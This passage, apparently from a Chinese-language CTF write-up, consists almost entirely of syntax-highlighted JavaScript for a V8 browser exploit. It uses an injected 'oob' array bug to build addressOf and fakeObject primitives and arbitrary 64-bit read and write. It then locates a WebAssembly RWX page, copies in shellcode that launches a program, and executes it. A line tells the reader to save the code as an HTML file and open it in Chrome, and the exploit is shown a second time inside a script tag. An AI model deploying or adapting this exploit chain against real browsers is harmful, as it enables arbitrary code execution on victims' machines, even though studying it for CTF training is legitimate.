	<span class="token keyword">let</span> faked_obj <span class="token operator">=</span> float_array<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

	float_array<span class="token punctuation">.</span><span class="token function">oob</span><span class="token punctuation">(</span>float_array_map<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">return</span> faked_obj<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">var</span> buf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayBuffer</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> float64 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Float64Array</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> bigUint64 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BigUint64Array</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">//float to integer</span>
<span class="token keyword">function</span> <span class="token function">f2i</span><span class="token punctuation">(</span><span class="token parameter">f</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	float64<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> f<span class="token punctuation">;</span>

	<span class="token keyword">return</span> bigUint64<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">//integer to float</span>
<span class="token keyword">function</span> <span class="token function">i2f</span><span class="token punctuation">(</span><span class="token parameter">i</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	bigUint64<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>

	<span class="token keyword">return</span> float64<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>


<span class="token comment">//hex</span>
<span class="token keyword">function</span> <span class="token function">hex</span><span class="token punctuation">(</span><span class="token parameter">i</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	<span class="token keyword">return</span> i<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">padStart</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>


<span class="token comment">//create fake array obj</span>
<span class="token keyword">var</span> fake_array <span class="token operator">=</span> <span class="token punctuation">[</span>
    float_array_map<span class="token punctuation">,</span>
    <span class="token function">i2f</span><span class="token punctuation">(</span><span class="token number">0n</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">i2f</span><span class="token punctuation">(</span><span class="token number">0x41414141n</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">i2f</span><span class="token punctuation">(</span><span class="token number">0x1000000000n</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token number">1.1</span><span class="token punctuation">,</span>
    <span class="token number">2.2</span><span class="token punctuation">,</span>
<span class="token punctuation">]</span><span class="token punctuation">;</span>


<span class="token keyword">var</span> fake_obj_addr <span class="token operator">=</span> <span class="token function">addressOf</span><span class="token punctuation">(</span>fake_array<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x40n</span> <span class="token operator">+</span> <span class="token number">0x10n</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> fake_obj <span class="token operator">=</span> <span class="token function">fakeObject</span><span class="token punctuation">(</span>fake_obj_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>


<span class="token keyword">function</span> <span class="token function">read64</span><span class="token punctuation">(</span><span class="token parameter">addr</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	fake_array<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">i2f</span><span class="token punctuation">(</span>addr <span class="token operator">-</span> <span class="token number">0x10n</span> <span class="token operator">+</span> <span class="token number">0x1n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">let</span> data <span class="token operator">=</span> <span class="token function">f2i</span><span class="token punctuation">(</span>fake_obj<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	
	<span class="token keyword">return</span> data<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function">write64</span><span class="token punctuation">(</span><span class="token parameter">addr<span class="token punctuation">,</span> i</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>	
	fake_array<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">i2f</span><span class="token punctuation">(</span>addr <span class="token operator">-</span> <span class="token number">0x10n</span> <span class="token operator">+</span> <span class="token number">0x1n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	fake_obj<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">i2f</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">var</span> wasmCode <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uint8Array</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">133</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">96</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">127</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">130</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">132</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">112</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">131</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">129</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">145</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">121</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">138</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">132</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">65</span><span class="token punctuation">,</span><span class="token number">42</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">var</span> wasmModule <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WebAssembly<span class="token punctuation">.</span>Module</span><span class="token punctuation">(</span>wasmCode<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> wasmInstance <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WebAssembly<span class="token punctuation">.</span>Instance</span><span class="token punctuation">(</span>wasmModule<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> f <span class="token operator">=</span> wasmInstance<span class="token punctuation">.</span>exports<span class="token punctuation">.</span>main<span class="token punctuation">;</span>

<span class="token keyword">var</span> f_addr <span class="token operator">=</span> <span class="token function">addressOf</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x1n</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'f_addr = 0x'</span> <span class="token operator">+</span> <span class="token function">hex</span><span class="token punctuation">(</span>f_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">var</span> shared_info_addr <span class="token operator">=</span> <span class="token function">read64</span><span class="token punctuation">(</span>f_addr <span class="token operator">+</span> <span class="token number">0x18n</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x1n</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> wasm_exported_func_data_addr <span class="token operator">=</span> <span class="token function">read64</span><span class="token punctuation">(</span>shared_info_addr <span class="token operator">+</span> <span class="token number">0x8n</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x1n</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> wasm_instance_addr <span class="token operator">=</span> <span class="token function">read64</span><span class="token punctuation">(</span>wasm_exported_func_data_addr <span class="token operator">+</span> <span class="token number">0x10n</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x1n</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> rwx_page_addr <span class="token operator">=</span> <span class="token function">read64</span><span class="token punctuation">(</span>wasm_instance_addr <span class="token operator">+</span> <span class="token number">0x88n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'rwx_page_addr = 0x'</span> <span class="token operator">+</span> <span class="token function">hex</span><span class="token punctuation">(</span>rwx_page_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">var</span> sc_arr <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token number">0x10101010101b848n</span><span class="token punctuation">,</span>    <span class="token number">0x62792eb848500101n</span><span class="token punctuation">,</span>    <span class="token number">0x431480101626d60n</span><span class="token punctuation">,</span>    <span class="token number">0x2f7273752fb84824n</span><span class="token punctuation">,</span>
    <span class="token number">0x48e78948506e6962n</span><span class="token punctuation">,</span>    <span class="token number">0x1010101010101b8n</span><span class="token punctuation">,</span>    <span class="token number">0x6d606279b8485001n</span><span class="token punctuation">,</span>    <span class="token number">0x2404314801010162n</span><span class="token punctuation">,</span>
    <span class="token number">0x1485e086a56f631n</span><span class="token punctuation">,</span>    <span class="token number">0x313b68e6894856e6n</span><span class="token punctuation">,</span>    <span class="token number">0x101012434810101n</span><span class="token punctuation">,</span>    <span class="token number">0x4c50534944b84801n</span><span class="token punctuation">,</span>
    <span class="token number">0x6a52d231503d5941n</span><span class="token punctuation">,</span>    <span class="token number">0x894852e201485a08n</span><span class="token punctuation">,</span>    <span class="token number">0x50f583b6ae2n</span><span class="token punctuation">,</span>
<span class="token punctuation">]</span>



<span class="token keyword">var</span> buffer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayBuffer</span><span class="token punctuation">(</span>sc_arr<span class="token punctuation">.</span>length <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> data_view <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DataView</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> buf_backing_store_addr <span class="token operator">=</span> <span class="token function">addressOf</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1n</span> <span class="token operator">+</span> <span class="token number">0x20n</span><span class="token punctuation">;</span>

<span class="token function">write64</span><span class="token punctuation">(</span>buf_backing_store_addr<span class="token punctuation">,</span> rwx_page_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> sc_arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
	data_view<span class="token punctuation">.</span><span class="token function">setFloat64</span><span class="token punctuation">(</span>i <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token function">i2f</span><span class="token punctuation">(</span>sc_arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>写成 html 文件，让 chrome 打开：</p>
<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">

<span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"a"</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> obj_array <span class="token operator">=</span> <span class="token punctuation">[</span>obj<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> float_array <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1.1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token comment">// leak map</span>
<span class="token keyword">var</span> obj_array_map <span class="token operator">=</span> obj_array<span class="token punctuation">.</span><span class="token function">oob</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> float_array_map <span class="token operator">=</span> float_array<span class="token punctuation">.</span><span class="token function">oob</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>



<span class="token comment">//leak address of obj</span>
<span class="token comment">//obj_to_leak: Object</span>
<span class="token comment">//return: integer</span>
<span class="token keyword">function</span> <span class="token function">addressOf</span><span class="token punctuation">(</span><span class="token parameter">obj_to_leak</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	obj_array<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> obj_to_leak<span class="token punctuation">;</span>
	obj_array<span class="token punctuation">.</span><span class="token function">oob</span><span class="token punctuation">(</span>float_array_map<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//类型混淆</span>

	<span class="token keyword">let</span> obj_addr <span class="token operator">=</span> obj_array<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	obj_array<span class="token punctuation">.</span><span class="token function">oob</span><span class="token punctuation">(</span>obj_array_map<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//恢复类型</span>

	<span class="token keyword">return</span> <span class="token function">f2i</span><span class="token punctuation">(</span>obj_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">//create fake object</span>
<span class="token comment">//addr_to_fake: interger</span>
<span class="token keyword">function</span> <span class="token function">fakeObject</span><span class="token punctuation">(</span><span class="token parameter">addr_to_fake</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>

	float_array<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">i2f</span><span class="token punctuation">(</span>addr_to_fake<span class="token punctuation">)</span><span class="token punctuation">;</span>
	float_array<span class="token punctuation">.</span><span class="token function">oob</span><span class="token punctuation">(</span>obj_array_map<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">let</span> faked_obj <span class="token operator">=</span> float_array<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

	float_array<span class="token punctuation">.</span><span class="token function">oob</span><span class="token punctuation">(</span>float_array_map<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">return</span> faked_obj<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">var</span> buf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayBuffer</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> float64 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Float64Array</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> bigUint64 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BigUint64Array</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">//float to integer</span>
<span class="token keyword">function</span> <span class="token function">f2i</span><span class="token punctuation">(</span><span class="token parameter">f</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	float64<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> f<span class="token punctuation">;</span>

	<span class="token keyword">return</span> bigUint64<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">//integer to float</span>
<span class="token keyword">function</span> <span class="token function">i2f</span><span class="token punctuation">(</span><span class="token parameter">i</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	bigUint64<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>

	<span class="token keyword">return</span> float64<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">//hex</span>
<span class="token keyword">function</span> <span class="token function">hex</span><span class="token punctuation">(</span><span class="token parameter">i</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	<span class="token keyword">return</span> i<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">padStart</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>


<span class="token comment">//create fake array obj</span>
<span class="token keyword">var</span> fake_array <span class="token operator">=</span> <span class="token punctuation">[</span>
    float_array_map<span class="token punctuation">,</span>
    <span class="token function">i2f</span><span class="token punctuation">(</span><span class="token number">0n</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">i2f</span><span class="token punctuation">(</span><span class="token number">0x41414141n</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">i2f</span><span class="token punctuation">(</span><span class="token number">0x1000000000n</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token number">1.1</span><span class="token punctuation">,</span>
    <span class="token number">2.2</span><span class="token punctuation">,</span>
<span class="token punctuation">]</span><span class="token punctuation">;</span>


<span class="token keyword">var</span> fake_obj_addr <span class="token operator">=</span> <span class="token function">addressOf</span><span class="token punctuation">(</span>fake_array<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x40n</span> <span class="token operator">+</span> <span class="token number">0x10n</span><span class="token punctuation">;</span>
<span class="token comment">//console.log('fake_obj_addr = ' + hex(fake_obj_addr));</span>
<span class="token keyword">var</span> fake_obj <span class="token operator">=</span> <span class="token function">fakeObject</span><span class="token punctuation">(</span>fake_obj_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">read64</span><span class="token punctuation">(</span><span class="token parameter">addr</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	fake_array<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">i2f</span><span class="token punctuation">(</span>addr <span class="token operator">-</span> <span class="token number">0x10n</span> <span class="token operator">+</span> <span class="token number">0x1n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">let</span> data <span class="token operator">=</span> <span class="token function">f2i</span><span class="token punctuation">(</span>fake_obj<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	
	<span class="token keyword">return</span> data<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function">write64</span><span class="token punctuation">(</span><span class="token parameter">addr<span class="token punctuation">,</span> i</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>	
	fake_array<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">i2f</span><span class="token punctuation">(</span>addr <span class="token operator">-</span> <span class="token number">0x10n</span> <span class="token operator">+</span> <span class="token number">0x1n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	fake_obj<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">i2f</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>


<span class="token keyword">var</span> wasmCode <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uint8Array</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">133</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">96</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">127</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">130</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">132</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">112</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">131</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">129</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">145</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">121</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">138</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">132</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">65</span><span class="token punctuation">,</span><span class="token number">42</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

